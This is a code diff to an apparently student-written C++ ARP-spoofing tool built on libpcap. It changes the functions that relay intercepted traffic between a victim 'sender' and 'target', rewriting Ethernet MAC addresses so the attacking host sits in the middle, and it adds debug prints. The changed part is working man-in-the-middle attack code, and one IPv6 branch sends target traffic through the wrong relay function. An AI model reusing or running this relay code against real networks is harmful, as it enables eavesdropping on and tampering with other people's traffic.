@@ -38,8 +38,8 @@ void target_arp_attack(list<ARP_TABLE> &arp_list,pcap_t* handle);
 int continue_attack(list<ARP_TABLE> &arp_list,pcap_t* handle);
 void check_unicast_broadcast_packet(list<ARP_TABLE> &arp_list,pcap_t* handle);
 void answer_unicast(list<ARP_TABLE> &arp_list,pcap_t*handle,int distinguish);
-void relay_sender_to_target(list<ARP_TABLE> &arp_list,const u_char * packet,pcap_t* handle,int length);
-void relay_target_to_sender(list<ARP_TABLE> &arp_list,const u_char * packet,pcap_t* handle,int length);
+void relay_sender_to_target(list<ARP_TABLE> &arp_list,u_char * packet,pcap_t* handle,int length);
+void relay_target_to_sender(list<ARP_TABLE> &arp_list,u_char * packet,pcap_t* handle,int length);
 void check_packet(list<ARP_TABLE>&arp_list,pcap_t*handle);
 int main(int argc, char* argv[]) {
 	//list의 형태로 arp-table을 구성
@@ -141,12 +141,14 @@ void check_packet(list<ARP_TABLE>&arp_list,pcap_t*handle)
             //relay sender -> target
             if(ethHdr_->smac_ == sender_address.mac_a)
             {
-                relay_sender_to_target(arp_list,packet,handle,length);
+                u_char * packet_casting = (u_char*)packet;
+                relay_sender_to_target(arp_list,packet_casting,handle,length);
             }
             //relay target -> sender
             if(ethHdr_->smac_ == target_address.mac_a)
             {
-                relay_target_to_sender(arp_list,packet,handle,length);
+                u_char * packet_casting = (u_char*)packet;
+                relay_target_to_sender(arp_list,packet_casting,handle,length);
             }
         }
         //ipv6일때
@@ -155,12 +157,14 @@ void check_packet(list<ARP_TABLE>&arp_list,pcap_t*handle)
             //relay sender -> target
             if(ethHdr_->smac_ == sender_address.mac_a)
             {
-                relay_sender_to_target(arp_list,packet,handle,length);
+                u_char * packet_casting = (u_char*)packet;
+                relay_sender_to_target(arp_list,packet_casting,handle,length);
             }
             //relay target -> sender
             if(ethHdr_->smac_ == target_address.mac_a)
             {
-                relay_sender_to_target(arp_list,packet,handle,length);
+                u_char * packet_casting = (u_char*)packet;
+                relay_sender_to_target(arp_list,packet_casting,handle,length);
             }
         }
         //arp일떄
@@ -192,7 +196,7 @@ void check_packet(list<ARP_TABLE>&arp_list,pcap_t*handle)
         }
     }
 }
-void relay_target_to_sender(list<ARP_TABLE>&arp_list,const u_char * packet, pcap_t*handle,int length)
+void relay_target_to_sender(list<ARP_TABLE>&arp_list,u_char * packet, pcap_t*handle,int length)
 {
     struct EthHdr * ethHdr_;
     list<ARP_TABLE>::iterator iter = arp_list.begin();
@@ -205,13 +209,13 @@ void relay_target_to_sender(list<ARP_TABLE>&arp_list,const u_char * packet, pcap
     target_address = *iter;
 
     u_char * copy_packet = NULL;
-    copy_packet = (u_char *)packet;
+    copy_packet = packet;
     ethHdr_ = (struct EthHdr *)copy_packet;
 
     ethHdr_->smac_ = my_address.mac_a;
-    ethHdr_->dmac_ = target_address.mac_a;
+    ethHdr_->dmac_ = sender_address.mac_a;
 
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ethHdr_), length);
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(copy_packet), length);
 
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -219,7 +223,7 @@ void relay_target_to_sender(list<ARP_TABLE>&arp_list,const u_char * packet, pcap
 
 }
 
-void relay_sender_to_target(list<ARP_TABLE>&arp_list,const u_char * packet, pcap_t*handle,int length)
+void relay_sender_to_target(list<ARP_TABLE>&arp_list,u_char * packet, pcap_t*handle,int length)
 {
     struct EthHdr * ethHdr_;
     list<ARP_TABLE>::iterator iter = arp_list.begin();
@@ -232,13 +236,21 @@ void relay_sender_to_target(list<ARP_TABLE>&arp_list,const u_char * packet, pcap
     target_address = *iter;
 
     u_char * copy_packet = NULL;
-    copy_packet = (u_char *)packet;
+    copy_packet = packet;
     ethHdr_ = (struct EthHdr *)copy_packet;
+    printf("\n\n\n\n");
+    std::cout << std::string(ethHdr_->smac()) << std::endl;
+    std::cout << std::string(ethHdr_->dmac()) << std::endl;
 
-    ethHdr_->smac_ = sender_address.mac_a;
-    ethHdr_->dmac_ = my_address.mac_a;
+    std::cout << std::string(sender_address.mac_a) << std::endl;
+    std::cout << std::string(my_address.mac_a) << std::endl;
+    ethHdr_->smac_ = my_address.mac_a;
+    ethHdr_->dmac_ = target_address.mac_a;
 
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ethHdr_), length);
+    std::cout << std::string(ethHdr_->smac()) << std::endl;
+    std::cout << std::string(ethHdr_->dmac()) << std::endl;
+    printf("\n\n\n\n");
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(copy_packet), length);
 
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
